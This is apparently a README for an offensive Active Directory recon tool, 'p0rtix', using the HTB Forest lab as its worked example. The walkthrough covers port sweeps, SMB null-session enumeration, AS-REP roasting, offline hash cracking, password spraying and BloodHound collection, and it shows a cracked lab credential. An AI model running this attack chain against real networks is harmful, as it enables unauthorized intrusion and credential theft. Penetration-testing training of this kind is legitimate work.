# p0rtix operator console — a Forest handbook

A hands-on guide to driving the `--mode console` operator dashboard (engine v2)
through a full internal-AD recon arc, using **HTB Forest** as the worked example.
The console is a *stateful planner you steer*: it shows you what it can do right
now, what it's waiting on, and exactly how loud each move is — and nothing fires
until you (or the automation dial) say so.

> Forest values (domain `htb.local`, user `svc-alfresco`, etc.) appear here only
> as a concrete walkthrough. The engine discovers all of it live; nothing about
> the box is baked into the tool.

---

## 1. Launch

```bash
# interactive dashboard (needs a real terminal + textual installed)
sudo python3 p0rtix.py 10.129.95.210 --mode console --name forest --workspace ~/HTB

# fully manual + quiet — the console opens at PASSIVE, having sent zero packets
#   add --level N to auto-run on launch (see §6)
#   add --headless to force the line-mode REPL (or when piping commands)
```

Root is needed for the SYN/UDP sweeps and `/etc/hosts` writes. The console opens
at **PASSIVE** — it has touched the target with nothing yet.

---

## 2. The screen

```
┌ p0rtix — operator console ───────────────────────────── clock ┐
│ STATE (left)              │ ACTIONS  (↑↓ browse · enter/click) │
│  TARGET  10.129.95.210    │  AVAILABLE                         │
│  DOMAIN  —                │  ● discovery.tcp_ports  full SYN…  │
│  POSTURE · passive        │  · recon.parse_prior    reads XML… │
│  PORTS   0 open           │  DORMANT                           │
│  LOOT  users 0 · …        │  ○ smb.anon_enum — needs SMB 445   │
│  STATUS …                 │  ○ kerberos.asrep_roast — needs …  │
├───────────────────────────┴────────────────────────────────────┤
│ DETAIL: highlighted action — tier, what it does, the trace it   │
│         leaves (network sig / Windows event IDs)                │
├──────────────────────────────────────────────────────────────────┤
│ LOG: command echoes + action results stream here                 │
├──────────────────────────────────────────────────────────────────┤
│ > command — type 'help', or run actions from the list above      │
└ ^C Quit  ^R Run all  ^O Command  F1 Help ───────────────────────┘
```

- **State pane** — the live fact store: target, domain, posture, open ports,
  loot counts (users / cred candidates / valid creds / hashes), lockout, and
  per-protocol status.
- **Actions list** — every capability, grouped **Available / Dormant /
  Exhausted**. `↑/↓` to browse, **Enter or click** to run an available one.
  Selecting a *dormant* row prints why it's blocked.
- **Detail line** — for the highlighted action: its tier, a one-line
  description, and its **footprint** (network signature, Windows event IDs).
  This is where you learn *what a scan does* before running it.
- **Log** — command echoes and streamed action results (findings also persist to
  `findings.md`).
- **Command box** — for everything not a single click (`noise`, `set`, `why`,
  `run-all`, …). `^O` jumps here.

---

## 3. The noise floor (read this first)

Every action carries a **tier** on a noise ladder, and the **posture** is the
ceiling you've allowed. An action can run only when `tier ≤ posture`.

| Tier | Glyph | Meaning | Forest examples |
|------|-------|---------|-----------------|
| **passive** | `·` (dim) | zero packets to target — local/parse/offline | `recon.parse_prior`, `crack.hashes` |
| **green** | `●` green | discovery + non-intrusive reads, no auth events | `discovery.tcp_ports`, `smb.anon_enum`, `ldap.anon_bind` |
| **yellow** | `●` yellow | writes Windows Security events / obvious auth traffic | `kerberos.asrep_roast`, `creds.spray`, `ad.authenticated_core` |
| **red** | `●` red | destructive / exploit-grade — locked unless armed | (none registered yet) |

You raise the ceiling deliberately:

```
noise green      # allow green actions
noise yellow     # allow green + yellow
noise red        # only if RED is armed (set dangerous on, or --level 7+)
```

The console **never auto-escalates past your ceiling**. The detail pane always
shows the trace an action leaves, so "how loud is this" is answered before you
commit. Offline `crack.hashes` stays PASSIVE — it runs at any posture because it
sends nothing to the box.

---

## 4. Forest, phase by phase

Open at PASSIVE, then drive it. Watch the **state pane** change after each step —
that's the planner learning facts, which **unlocks** the next actions.

### Phase A — discovery (green)
```
noise green
run discovery.tcp_ports        # full SYN sweep (~40s); PORTS jumps to 24 open
run svc.version_detect         # optional: -sV per open port
```
As soon as `tcp/445`, `tcp/389`, etc. appear, `smb.anon_enum` and
`ldap.anon_bind` move from **Dormant** → **Available**.

### Phase B — anonymous enumeration (green)
```
run smb.anon_enum     # null session: domain=htb.local, hostnames, lockout=0,
                      #   and the full user list incl. svc-alfresco / Administrator
run ldap.anon_bind    # anonymous directory reads
```
State pane now shows `DOMAIN htb.local`, `users 33`, `lockout 0`. Because lockout
is 0, spraying later is safe by design.

> Tip: highlight `smb.anon_enum` and read the detail line — it tells you it does
> the null session + RID cycle + shares + users, and notes the `4624` logon it
> may leave.

### Phase C — AS-REP roast → crack (yellow → passive)
```
noise yellow
run kerberos.asrep_roast   # GetNPUsers over the user list → svc-alfresco hash
                           #   HASHES shows 'asrep'; crack.hashes becomes available
run crack.hashes           # offline hashcat + rockyou → svc-alfresco:s3rvice
                           #   CREDS shows '1 cand'
```
`kerberos.asrep_roast` was dormant until **both** a domain and a user list
existed — that's the unlock-on-new-fact planner. `crack.hashes` unlocked the
instant a hash was captured, and it's PASSIVE so posture never blocks it.

### Phase D — validate the credential (yellow)
```
run creds.spray            # sprays s3rvice across all users via SMB/WinRM
                           #   CREDS flips to '1 valid' → svc-alfresco:s3rvice
```

### Phase E — authenticated AD core (yellow)
```
run ad.authenticated_core  # ldapdomaindump, kerberoast, BloodHound (zip in
                           #   loot/bloodhound/), LAPS/gMSA, writable-objects
```
The writable-objects output is the prize: svc-alfresco (via Account Operators)
can write to **`Exchange Windows Permissions`** — the path to Domain Admin. The
BloodHound zip is yours to ingest.

That's the **export boundary**: validated cred + hosts + the attack path. p0rtix
stops here by design (recon, not C2); executing the WriteDACL → DCSync privesc is
the operator's / C2's job.

### One-shot variant
Instead of stepping, set a ceiling and let it cascade:
```
noise yellow
run-all            # (or ^R) runs every available action at/below yellow,
                   #   cascading as each new fact unlocks the next
```

---

## 5. Command reference

| Command | What it does |
|---------|--------------|
| `status` | campaign overview (posture, ports, loot counts) |
| `facts` / `ports` | dump the fact store / open ports |
| `actions [--all]` | runnable actions (`--all` adds dormant/exhausted) |
| `dormant` / `exhausted` | greyed-out (with missing inputs) / already-run |
| `why <action>` | explain an action's current state in plain language |
| `run <action>` | dispatch one action (runs on a worker thread) |
| `run-all` / `auto` | dispatch everything at/below the current posture |
| `noise <green\|yellow\|red>` | raise/lower the noise ceiling |
| `set domain <d>` | populate a fact by hand |
| `add user <u>` / `creds add <u:p>` | seed a user / a known credential |
| `set dangerous on` | arm RED |
| `reload` | re-read `loot/*.txt` from disk (pick up manual edits) |
| `recheck users` | re-arm user-list actions (override collect-once) |
| `help` | this list |

Keys: **^R** run-all · **^O** focus command box · **F1** help · **^C** quit.

---

## 6. The automation dial (`--level 0-9`)

`--level` decides how far a launch-time `run-all` auto-climbs before handing you
control:

| Dial | On launch |
|------|-----------|
| `0` | fully manual, opens at PASSIVE (default) |
| `1-3` | auto-run **green** |
| `4-6` | auto-run **green + yellow** |
| `7-9` | auto-run through **red** (RED armed); `9` also suppresses warnings |

So `--level 5` on Forest will, at launch, sweep → anon-enum → AS-REP → crack →
spray → authenticated core on its own, then drop you at the prompt at YELLOW.
`--level 0` (default) lets you walk every step as in §4.

---

## 7. Headless / scripted

When stdin isn't a TTY (or with `--headless`), the same engine runs as a line
REPL over the identical command set — handy for piping a fixed playbook:

```bash
printf 'noise yellow\nrun discovery.tcp_ports\nrun smb.anon_enum\nrun-all\nexit\n' \
  | sudo python3 p0rtix.py 10.129.95.210 --mode console --name forest --workspace ~/HTB
```
